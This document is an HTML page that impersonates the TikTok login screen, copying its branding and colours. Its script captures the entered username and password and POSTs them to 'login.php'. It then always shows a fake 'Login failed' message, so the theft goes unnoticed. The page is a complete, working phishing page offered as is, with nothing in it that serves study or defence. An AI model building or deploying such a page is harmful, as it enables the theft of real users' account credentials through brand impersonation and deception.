<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: #121212; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.8); width: 380px; }
        .logo { text-align: center; font-size: 30px; color: #fff; font-weight: bold; margin-bottom: 20px; }
        .logo span { color: #25f4ee; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #1a1a1a; color: white; }
        input:focus { border-color: #25f4ee; outline: none; }
        button { width: 100%; padding: 14px; background: #25f4ee; color: #000; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { background: #1dd9d3; }
        .error { color: #ff6b6b; text-align: center; margin-top: 10px; display: none; }
    </style>
</head>
<body>
<div class="box">
    <div class="logo">🎵 <span>Tik</span>Tok</div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Email or Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
        <div class="error" id="errorMsg">Login failed. Please try again.</div>
    </form>
</div>
<script>
document.getElementById('loginForm').onsubmit = function(e) {
    e.preventDefault();
    var user = document.getElementById('username').value;
    var pass = document.getElementById('password').value;
    fetch('login.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass)
    })
    .then(res => res.json())
    .then(data => {
        document.getElementById('errorMsg').style.display = 'block';
    });
};
</script>
</body>
</html>
